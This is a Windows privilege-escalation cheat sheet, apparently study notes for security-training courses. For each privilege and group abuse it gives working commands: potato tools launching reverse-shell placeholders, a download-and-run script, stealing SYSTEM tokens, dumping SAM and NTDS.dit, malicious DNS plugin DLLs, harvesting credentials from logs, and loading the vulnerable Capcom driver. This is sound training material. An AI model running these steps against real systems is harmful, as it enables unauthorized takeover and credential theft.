# Privileges

[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
[![windowsprivesc20](../../../../_badges/thmp/windowsprivesc20.svg)](https://tryhackme.com/room/windowsprivesc20)
[![adventofcyber2](../../../../_badges/thm/adventofcyber2/day11.svg)](https://tryhackme.com/room/adventofcyber2)

<div class="row row-cols-lg-2"><div>

Users may have privileges for running some system tasks such as backups that may be used to escalate.

We can list your privileges with the command below, **but**, you won't see all of them unless you're in an admin prompt.

```shell!
PS> whoami /priv
PS> # your groups can have privileges too!
```

Privileges are [listed and explained here](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).
</div><div>

You can find way to exploit them on: 

* [Priv2Admin](https://github.com/gtworek/Priv2Admin) <small>(1.7k ⭐)</small>
* [PrivFu](https://github.com/daem0nc0re/PrivFu/) <small>(0.7k ⭐)</small>
* ...

Privileges may have been granted but not enabled. Some privileges can be enable using their exploit script, others can be enabled with builtin commands, and for most others, we can use:

* [Set-TokenPrivilege.ps1](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) <small>(2011 🪦)</small>
* [PoshPrivilege](https://github.com/proxb/PoshPrivilege/) with [Enable-Privilege.ps1](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1) <small>(0.1k ⭐, 2015 🪦)</small> 
</div></div>

<hr class="sep-both">

## NormalPrompt2Admin

<div class="row row-cols-lg-2"><div>

We may use these as a normal user to escalate to admin.

#### SeImpersonate — steal access tokens

[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
 
The most common approach is to use [potato](/cybersecurity/red-team/s4.privesc/windows/tools/potato.md) scripts. 

```ps
PS> # You can pick any port for -l. It's for DCOM traffic. 
PS> .\JuicyPotato.exe -l any_port -p c:\windows\system32\cmd.exe -a "/c <reverse shell command>" -t *
````

You can use [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) <small>(1.7k ⭐, 2020 🪦)</small>:

````ps
PS> .\PrintSpoofer.exe -c "<reverse shell command>"
````

Additional references:

* [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) <small>(0.5k ⭐, 2020 🪦)</small> using [WinRM](/operating-systems/networking/protocols/winrm.md)
* [token-priv](https://github.com/hatRiot/token-priv/tree/master) <small>(0.7k ⭐, 2017 🪦)</small>
</div><div>
</div></div>

<hr class="sep-both">

## ElevatedPromptToAdmin

<div class="row row-cols-lg-2"><div>

We may use these from an elevated prompt to escalate to admin.

#### SeDebugPrivilege — Dump Process Memory

[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)

We can use methods shown in [Dump Credentials From LSASS Process](/operating-systems/windows/security/index.md#dump-credentials-from-lsass-process) to dump a process memory, which is often LSASS.

We can also steal and reuse the parent [access token](/operating-systems/windows/security/index.md#access-token) such as LSASS.

```ps
PS> wget "https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1" -O psgetsys.ps1
PS> .\psgetsys.ps1
PS> [MyProcess]::CreateProcessFromParent(<target_process_pid>,"<command_to_execute>","")
```

➡️ See also: [PrivFu/SeDebugPrivilegePoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC).
</div><div>

#### SeTakeOwnershipPrivilege — Takeover Any File/Folder

[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)

We could access the SAM database or NTDS.dit...

```shell!
PS> takeown /f 'C:\poc.txt'
PS> icacls 'C:\poc.txt' /grant my_username:F
```
</div></div>

<hr class="sep-both">

## GroupToAdmin

<div class="row row-cols-lg-2"><div>

#### Backup Operators — Access any file

[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)

*-- Grants SeBackup and SeRestore privileges --*

We can use [SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege) <small>(0.2k ⭐, 2013 🪦)</small> to enable/disable the privilege and exploit it.

```shell!
PS> Import-Module .\SeBackupPrivilegeUtils.dll
PS> Import-Module .\SeBackupPrivilegeCmdLets.dll
PS> Get-SeBackupPrivilege # is enabled?
PS> Set-SeBackupPrivilege # enable it
```

We can use `robocopy` to perform a backup copy:

```shell!
PS> robocopy /B <source_folder> <dest_folder> <filename>
```

We could access the SAM database or NTDS.dit...

<br>

#### DnsAdmins — Configure The DNS Service

[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)

*-- Grants access to network DNS information --*

The DNS service runs as NT AUTHORITY\SYSTEM. When restarted, if `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is set and points to a DLL file, then it will be executed. We can generate a DLL using [msfvenom](/cybersecurity/red-team/tools/frameworks/metasploit/msfvenom.md).

```ps
$ msfvenom -p windows/x64/exec cmd='<some command>' -f dll -o malicious.dll
```
```ps
PS> Get-ADGroupMember -Identity DnsAdmins # as DNS admin
PS> dnscmd /config /serverlevelplugindll <absolute_path_to_dll>
```

You need to restart the DNS service. If you made changes to the groups of the current user, you need to log out and log back in.

<br>

#### Event Log Readers — Can Read Logs

[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)

You may find cleartext credentials within the logs.

```ps
PS> wevtutil qe Security /rd:true /f:text | Select-String "/user"
PS> wevtutil qe Security /rd:true /f:text /r:share_name /u:username /p:password | Select-String "/user"
```

You can also use `Get-WinEvent` but it requires special permissions.
</div><div>

#### Server Operators

[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)

*-- Grants many privileges as [listed here](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators) --*

Members of the Server Operators group can administer domain controllers. They can start/stop/manage services, backup/restore files...

Refer to [Windows services](services.md) notes or [Backup Operators](#backup-operators--access-any-file) notes.

#### Print Operators

*-- Grants the SeLoadDriverPrivilege among other privileges --*

Members of the Print Operators can manage shares, delete printers, and before Windows 10 Version 1803, we would load a malicious driver using a user registry key. [Capcom](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) is a known vulnerable driver.

We could use [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) <small>(0.1k ⭐, 2018 🪦)</small> to enable the SeLoadDriverPrivilege and configure load the [capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) driver.

```ps
PS> .\EoPLoadDriver.exe System\CurrentControlSet\Capcom .\Capcom.sys
```

We could do it manually by compiling [EnableSeLoadDriverPrivilege](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) <small>(1.0k ⭐, 2018 🪦)</small> and create registry keys pointint to [capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys):

```ps
PS> .\EnableSeLoadDriverPrivilege.exe
<ok>
PS> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Path\to\Capcom.sys"
PS> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

<details class="details-n">
<summary>Compile EnableSeLoadDriverPrivilege.cpp on Windows</summary>

Add the following headers:

```cpp
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
<...>
```

You may use `cl` from Visual Studio or Windows SDK:

```shell!
PS> cl.exe /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```
</details>
</div></div>